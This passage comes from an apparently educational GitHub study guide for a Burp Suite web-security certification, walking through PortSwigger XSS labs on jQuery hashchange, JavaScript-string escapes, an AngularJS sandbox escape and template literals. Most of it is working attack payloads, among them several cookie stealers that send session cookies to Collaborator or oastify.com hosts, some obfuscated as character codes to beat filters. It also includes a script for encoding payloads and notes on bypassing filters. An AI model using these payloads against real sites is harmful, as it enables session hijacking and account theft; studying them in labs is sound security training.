<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;iframe src=&quot;https://TARGET.net/#&quot; onload=&quot;this.src+='&lt;img src=x onerror=print()&gt;'&quot;&gt;&lt;/iframe&gt;"><pre><span class="pl-c1">&lt;</span><span class="pl-s1">iframe</span> <span class="pl-c1">src</span><span class="pl-c1">=</span><span class="pl-s">"https://TARGET.net/#"</span> <span class="pl-c1">onload</span><span class="pl-c1">=</span><span class="pl-s">"this.src+='&lt;img src=x onerror=print()&gt;'"</span><span class="pl-c1">&gt;</span><span class="pl-kos">&lt;/</span><span class="pl-s1">iframe</span><span class="pl-c1">&gt;</span></pre></div>
<blockquote>
<p dir="auto">Note: <em><strong>Identify</strong></em> the vulnerable jquery 1.8.2 version included in the <code>source code</code> with the CSS selector action a the <strong>hashchange</strong>.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/hashchange.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/hashchange.png" alt="Hashchange" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event" rel="nofollow">PortSwigger Lab: DOM XSS in jQuery selector sink using a hashchange event</a></p>
<p dir="auto"><a href="https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/xss/dom_xss_jquery_hashchange/writeup.md">Crypto-Cat: DOM XSS in jQuery selector sink using a hashchange event</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Reflected String XSS</h3><a id="user-content-reflected-string-xss" class="anchor" aria-label="Permalink: Reflected String XSS" href="#reflected-string-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Submitting a search string and reviewing the <code>source code</code> of the search result page, the JavaScript string variable is <em><strong>identified</strong></em> to reflect the search string <code>tracker.gif</code> in the <code>source code</code> with a variable named <code>searchTerms</code>.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;section class=blog-header&gt;
	&lt;h1&gt;0 search results for 'fuzzer'&lt;/h1&gt;
	&lt;hr&gt;
&lt;/section&gt;
&lt;section class=search&gt;
	&lt;form action=/ method=GET&gt;
		&lt;input type=text placeholder='Search the blog...' name=term&gt;
		&lt;button type=submit class=button&gt;Search&lt;/button&gt;
    &lt;/form&gt;
    &lt;/section&gt;
	&lt;script&gt;
    var searchTerms = 'fuzzer';
    document.write('&lt;img src=&quot;/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'&quot;&gt;');
&lt;/script&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">section</span> <span class="pl-c1">class</span>=<span class="pl-s">blog-header</span><span class="pl-kos">&gt;</span>
	<span class="pl-kos">&lt;</span><span class="pl-ent">h1</span><span class="pl-kos">&gt;</span>0 search results for 'fuzzer'<span class="pl-kos">&lt;/</span><span class="pl-ent">h1</span><span class="pl-kos">&gt;</span>
	<span class="pl-kos">&lt;</span><span class="pl-ent">hr</span><span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">section</span><span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;</span><span class="pl-ent">section</span> <span class="pl-c1">class</span>=<span class="pl-s">search</span><span class="pl-kos">&gt;</span>
	<span class="pl-kos">&lt;</span><span class="pl-ent">form</span> <span class="pl-c1">action</span>=<span class="pl-s">/</span> <span class="pl-c1">method</span>=<span class="pl-s">GET</span><span class="pl-kos">&gt;</span>
		<span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>=<span class="pl-s">text</span> <span class="pl-c1">placeholder</span>='<span class="pl-s">Search the blog...</span>' <span class="pl-c1">name</span>=<span class="pl-s">term</span><span class="pl-kos">&gt;</span>
		<span class="pl-kos">&lt;</span><span class="pl-ent">button</span> <span class="pl-c1">type</span>=<span class="pl-s">submit</span> <span class="pl-c1">class</span>=<span class="pl-s">button</span><span class="pl-kos">&gt;</span>Search<span class="pl-kos">&lt;/</span><span class="pl-ent">button</span><span class="pl-kos">&gt;</span>
    <span class="pl-kos">&lt;/</span><span class="pl-ent">form</span><span class="pl-kos">&gt;</span>
    <span class="pl-kos">&lt;/</span><span class="pl-ent">section</span><span class="pl-kos">&gt;</span>
	<span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
    <span class="pl-k">var</span> <span class="pl-s1">searchTerms</span> <span class="pl-c1">=</span> <span class="pl-s">'fuzzer'</span><span class="pl-kos">;</span>
    <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">write</span><span class="pl-kos">(</span><span class="pl-s">'&lt;img src="/resources/images/tracker.gif?searchTerms='</span><span class="pl-c1">+</span><span class="pl-en">encodeURIComponent</span><span class="pl-kos">(</span><span class="pl-s1">searchTerms</span><span class="pl-kos">)</span><span class="pl-c1">+</span><span class="pl-s">'"&gt;'</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/javascript-string-reflection.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/javascript-string-reflection.png" alt="JavaScript string with single quote and backslash escaped" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Using a payload <code>test'payload</code> and observe that a single quote gets backslash-escaped, preventing breaking out of the string.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;"><pre><span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-s1">script</span><span class="pl-c1">&gt;</span><span class="pl-c1">&lt;</span><span class="pl-s1">script</span><span class="pl-c1">&gt;</span>alert(1)<span class="pl-kos">&lt;/</span><span class="pl-s1">script</span><span class="pl-c1">&gt;</span></pre></div>
<blockquote>
<p dir="auto">Changing the payload to a cookie stealer that deliver the session token to Burp Collaborator.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;/script&gt;&lt;script&gt;document.location=&quot;https://OASTIFY.COM/?cookie=&quot;+document.cookie&lt;/script&gt;"><pre><span class="pl-kos">&lt;/</span>script<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">location</span><span class="pl-c1">=</span><span class="pl-s">"https://OASTIFY.COM/?cookie="</span><span class="pl-c1">+</span><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span><span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/collaborator-get-cookies.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/collaborator-get-cookies.png" alt="collaborator get cookies" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">When placing this payload in <code>iframe</code>, the target application do not allow it to be embedded and give message: <code>refused to connect</code>.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped" rel="nofollow">PortSwigger Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped</a></p>
<blockquote>
<p dir="auto">In BSCP exam host the below payload on exploit server inside <code>&lt;script&gt;</code> tags, and the search query below before it is URL encoded.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;/ScRiPt &gt;&lt;img src=a onerror=document.location=&quot;https://OASTIFY.COM/?biscuit=&quot;+document.cookie&gt;"><pre class="notranslate"><code>&lt;/ScRiPt &gt;&lt;img src=a onerror=document.location="https://OASTIFY.COM/?biscuit="+document.cookie&gt;
</code></pre></div>
<blockquote>
<p dir="auto">Exploit Server hosting search term reflected vulnerability that is send to victim to obtain their session cookie.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;script&gt;
location = &quot;https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E&quot;
&lt;/script&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
<span class="pl-s1">location</span> <span class="pl-c1">=</span> <span class="pl-s">"https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E"</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre></div>
<blockquote>
<p dir="auto">The application gave error message <code>Tag is not allowed</code>, and this is bypassed using this <code>&lt;/ScRiPt &gt;</code>.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Reflected String Extra Escape</h3><a id="user-content-reflected-string-extra-escape" class="anchor" aria-label="Permalink: Reflected String Extra Escape" href="#reflected-string-extra-escape"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">See in <code>source code</code> the variable named <code>searchTerms</code>, and when submitting payload <code>fuzzer'payload</code>, see the single quote is backslash escaped, and then send a  <code>fuzzer\payload</code> payload and <em><strong>identify</strong></em> that the backslash is not escaped.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="\'-alert(1)//  

fuzzer\';console.log(12345);//  

fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computing`);//"><pre class="notranslate"><code>\'-alert(1)//  

fuzzer\';console.log(12345);//  

fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computing`);//
</code></pre></div>
<blockquote>
<p dir="auto">Using a single <strong>backslash</strong>, single quote and <strong>semicolon</strong> we escape out of the JavaScript string variable, then using back ticks to enclose the <code>document.location</code> path, allow for the cookie stealer to bypass application protection.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="\';document.location=`https://OASTIFY.COM/?BackTicks=`+document.cookie;//"><pre class="notranslate"><code>\';document.location=`https://OASTIFY.COM/?BackTicks=`+document.cookie;//
</code></pre></div>
<blockquote>
<p dir="auto">With help from Trevor I made this into cookie stealer payload, using back ticks. Thanks Trevor, here is his Youtube walk through <a href="https://youtu.be/Aqfl2Rj0qlU?t=598" rel="nofollow">XSS JavaScript String Angle Brackets Double Quotes Encoded Single</a></p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/fail-escape.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/fail-escape.png" alt="fail-escape" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped" rel="nofollow">PortSwigger Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">AngularJS Sandbox Escape</h3><a id="user-content-angularjs-sandbox-escape" class="anchor" aria-label="Permalink: AngularJS Sandbox Escape" href="#angularjs-sandbox-escape"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Expert PortSwigger Lab exercise using AngularJS 1.4.4 and versions 1.x has reached end of life and is no longer maintained.<br>
This lab uses <strong>AngularJS</strong> in an unusual way where the <code>$eval</code> function is not available and you will be unable to use any strings in AngularJS.<br>
Objective, perform a cross-site scripting attack that escapes the sandbox and executes the payload without using the <code>$eval</code> function.</p>
</blockquote>
<p dir="auto"><a href="https://youtu.be/gKLHVT67sU0?si=tqQMb5Y6xLA-jgR4" rel="nofollow">z3nsh3ll - YouTube Video give a great explanation of this Reflected XSS with AngularJS Sandbox Escape Without Strings</a></p>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> the <code>angular.module</code> in JavaScript source code:</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/angularJS-sandbox-escape-identify.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/angularJS-sandbox-escape-identify.png" alt="angularJS-sandbox-escape-identify.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">The <code>key</code> variable value <code>search</code> is injected into the JavaScript created dynamically.<br>
No obvious security issue present here. However, the security of this code depends on how this controller and the extracted values are used in the back-end.</p>
</blockquote>
<blockquote>
<p dir="auto">The <code>$parse</code> method evaluates the AngularJS expression <code>$scope.query</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">Using the <code>&amp;</code> to add second key value pair to test payload dynamic code generated.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/angularJS-sandbox-escape-add-2nd-keypair.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/angularJS-sandbox-escape-add-2nd-keypair.png" alt="angularJS-sandbox-escape-add-2nd-key pair" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Changing the second added key value name to expression to determine if evaluated, <code>/?search=key1value&amp;7*7=payload</code> and math result is 49.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/angularJS-sandbox-escape-2nd-keypair-eval.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/angularJS-sandbox-escape-2nd-keypair-eval.png" alt="angularJS-sandbox-escape-2nd-key pair-eval" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Constructing a payload fails when using <code>alert()</code> as the second key name in how angularJS compile the code through the parser.</p>
</blockquote>
<blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection" rel="nofollow">AngulaJS sandbox - See PortSwigger Client-Side template injection documents</a></p>
</blockquote>
<blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-(without-strings)" rel="nofollow">PortSwigger CheatSheet Reference Sandbox 1.4.4 escape</a></p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1"><pre class="notranslate"><code>1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
</code></pre></div>
<blockquote>
<p dir="auto">Collaborator payload <em><strong>cookie stealer</strong></em>:</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="x=fetch('https://m9w8haeauh0frftrtjdvexkyrpxgl69v.oastify.com/?z='+document.cookie)"><pre class="notranslate"><code>x=fetch('https://m9w8haeauh0frftrtjdvexkyrpxgl69v.oastify.com/?z='+document.cookie)
</code></pre></div>
<blockquote>
<p dir="auto">The ASCII decimal values for each character in the above payload string, separated by commas. Each number represents the ASCII decimal value of the corresponding character in the payload string.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="120,61,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,103,112,57,111,49,56,57,51,106,97,107,49,100,122,101,55,117,116,118,50,114,107,118,114,48,105,54,57,117,122,105,111,46,111,97,115,116,105,102,121,46,99,111,109,47,63,122,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41"><pre class="notranslate"><code>120,61,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,103,112,57,111,49,56,57,51,106,97,107,49,100,122,101,55,117,116,118,50,114,107,118,114,48,105,54,57,117,122,105,111,46,111,97,115,116,105,102,121,46,99,111,109,47,63,122,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41
</code></pre></div>
<blockquote>
<p dir="auto">Python script to convert any payload to ASCIII decimal values:</p>
</blockquote>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="import sys

print('Python String to ASCII Converter!')
if len(sys.argv) != 2:
    print(&quot;Usage: Python ascii_converter.py 'Payload_String'&quot;)
    sys.exit(1)

input_string = sys.argv[1]
ascii_values = [str(ord(char)) for char in input_string]

output = &quot;,&quot;.join(ascii_values)
print(output)
print('PortSwigger Expert Academy Labs!')"><pre><span class="pl-k">import</span> <span class="pl-s1">sys</span>

<span class="pl-en">print</span>(<span class="pl-s">'Python String to ASCII Converter!'</span>)
<span class="pl-k">if</span> <span class="pl-en">len</span>(<span class="pl-s1">sys</span>.<span class="pl-c1">argv</span>) <span class="pl-c1">!=</span> <span class="pl-c1">2</span>:
    <span class="pl-en">print</span>(<span class="pl-s">"Usage: Python ascii_converter.py 'Payload_String'"</span>)
    <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)

<span class="pl-s1">input_string</span> <span class="pl-c1">=</span> <span class="pl-s1">sys</span>.<span class="pl-c1">argv</span>[<span class="pl-c1">1</span>]
<span class="pl-s1">ascii_values</span> <span class="pl-c1">=</span> [<span class="pl-en">str</span>(<span class="pl-en">ord</span>(<span class="pl-s1">char</span>)) <span class="pl-k">for</span> <span class="pl-s1">char</span> <span class="pl-c1">in</span> <span class="pl-s1">input_string</span>]

<span class="pl-s1">output</span> <span class="pl-c1">=</span> <span class="pl-s">","</span>.<span class="pl-c1">join</span>(<span class="pl-s1">ascii_values</span>)
<span class="pl-en">print</span>(<span class="pl-s1">output</span>)
<span class="pl-en">print</span>(<span class="pl-s">'PortSwigger Expert Academy Labs!'</span>)</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/python-script-ascii_converter.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/python-script-ascii_converter.png" alt="python-script-ascii_converter.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Cookie Stealer Payload in ASCII decimal value AngularJS expression run through sandbox, from the PortSwigger solution steps:</p>
</blockquote>
<ol dir="auto">
<li>The exploit uses <code>toString()</code> to create a string without using quotes.</li>
<li>Then gets the String prototype and overwrites the <code>charAt</code> function for every string.</li>
<li>This breaks the AngularJS sandbox. allow an array passed to the <code>orderBy</code> filter.</li>
<li>Set the argument for the filter by again using <code>toString()</code> to create a string and the String constructor property.</li>
<li>Finally, use the <code>fromCharCode</code> method generate our payload by converting character codes into the payload example <code>x=alert(1)</code>.</li>
<li>The <code>charAt</code> function has been overwritten, AngularJS will allow this code to escape the <strong>Sandbox</strong>.</li>
</ol>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/angularJS-sandbox-escape-cookie-stealer.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/angularJS-sandbox-escape-cookie-stealer.png" alt="angularJS-sandbox-escape-cookie-stealer" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings" rel="nofollow">PortSwigger Expert Lab: Reflected XSS with AngularJS sandbox escape without strings</a></p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">XSS Template Literal</h3><a id="user-content-xss-template-literal" class="anchor" aria-label="Permalink: XSS Template Literal" href="#xss-template-literal"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">JavaScript template literal is <em><strong>identified</strong></em> by the back ticks <strong>`</strong> used to contain the string. On the target code we <em><strong>identify</strong></em> the search string is reflected inside a template literal string.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="${alert(document.cookie)}"><pre class="notranslate"><code>${alert(document.cookie)}
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xss-template-literal.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xss-template-literal.png" alt="xss template literal" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Thanks to <em><strong>Adrin Gyurcz</strong></em>, for providing awesome bypass where I failed to get a working cookie stealer bypass all filters for this lab.</p>
</blockquote>
<blockquote>
<p dir="auto"><em><strong>Adrin Gyurcz</strong></em> found the following research article from Portswigger that lead to the solution:<br>
<a href="https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows" rel="nofollow">bypassing-character-blocklists-with-unicode-overflows</a></p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">Pivoting from above, his payload:</h4><a id="user-content-pivoting-from-above-his-payload" class="anchor" aria-label="Permalink: Pivoting from above, his payload:" href="#pivoting-from-above-his-payload"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="${fetch(String.fromCharCode(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x30,0x62,0x63,0x6f,0x31,0x68,0x62,0x62,0x32,0x66,0x72,0x75,0x61,0x39,0x6b,0x79,0x64,0x35,0x78,0x77,0x6c,0x31,0x71,0x37,0x77,0x79,0x32,0x70,0x71,0x6e,0x65,0x63,0x2e,0x6f,0x61,0x73,0x74,0x69,0x66,0x79,0x2e,0x63,0x6f,0x6d,0x3f,0x74,0x65,0x73,0x7a,0x74,0x3d) + document.cookie)}"><pre class="notranslate"><code>${fetch(String.fromCharCode(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x30,0x62,0x63,0x6f,0x31,0x68,0x62,0x62,0x32,0x66,0x72,0x75,0x61,0x39,0x6b,0x79,0x64,0x35,0x78,0x77,0x6c,0x31,0x71,0x37,0x77,0x79,0x32,0x70,0x71,0x6e,0x65,0x63,0x2e,0x6f,0x61,0x73,0x74,0x69,0x66,0x79,0x2e,0x63,0x6f,0x6d,0x3f,0x74,0x65,0x73,0x7a,0x74,0x3d) + document.cookie)}
</code></pre></div>
<blockquote>
<p dir="auto">As the original lab session cookie has protection flags, he created a test dummy cookie for proof of concept:</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ag1.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ag1.png" alt="Adrin Gyurcz" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">after sending the payload in the search function, I got a cookie stealer hit:</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ag2.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ag2.png" alt="Adrin Gyurcz" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">I hope others find his research helpful, and including it in my guide Tx.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped" rel="nofollow">PortSwigger Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped</a></p>
<hr>
